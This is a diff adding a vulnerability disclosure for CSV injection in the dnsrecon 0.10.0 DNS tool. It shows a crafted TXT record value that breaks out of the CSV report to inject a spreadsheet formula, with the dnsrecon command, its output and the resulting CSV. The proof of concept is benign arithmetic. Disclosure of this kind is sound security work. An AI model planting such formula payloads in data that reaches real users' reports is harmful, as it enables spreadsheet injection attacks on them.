@@ -1,0 +1,37 @@
+# Exploit Title: dnsrecon 0.10.0 - CSV Injection
+# Author: Dolev Farhi
+# Date: 2021-01-07
+# Vendor Homepage: https://github.com/darkoperator/dnsrecon/
+# Version : 0.10.0
+# Tested on: ParrotOS 4.10
+
+dnsrecon, when scanning a TXT record such as SPF, i.e.: _spf.domain.com, outputs a CSV report (-c out.csv) with entries such as Type,Name,Address,Target,Port and String.
+A TXT record allows many characters including single quote and equal signs, it's possible to escape the CSV structure by creating a TXT record in the following way:
+
+_spf.example.com       "test',=1+1337,'z"
+
+
+user@parrot-virtual:~$ sudo dnsrecon -d _spf.example.com -c ./file.csv -n 8.8.8.8
+[*] Performing General Enumeration of Domain: _spf.example.com
+[-] DNSSEC is not configured for _spf.example.com
+[*] 	 SOA ns-59.awsdns-07.com 205.1.1.1
+[-] Could not Resolve NS Records for _spf.example.com
+[-] Could not Resolve MX Records for _spf.example.com
+[*] 	 TXT _spf.example.com test',=1+1337,'z
+[*] Enumerating SRV Records
+[+] 0 Records Found
+[*] Saving records to CSV file: ./file.csv
+{'type': 'SOA', 'mname': 'ns-59.awsdns-07.com', 'address': '205.1.1.1'}
+{'type': 'TXT', 'name': '_spf.example.com', 'strings': "test',=1+1337,'z"}
+
+
+This output will then be rewritten into a CSV with this structure:
+
+Type,Name,Address,Target,Port,String
+SOA,ns-59.awsdns-07.com,205.1.1.1
+TXT,_spf.example.com,,,,'test',=1+1337,'z'
+
+The flexibility of TXT record allows many variants of formulas to be injected, from RFC1464 https://tools.ietf.org/html/rfc1464:
+
+Attribute Values
+  All printable ASCII characters are permitted in the attribute value.
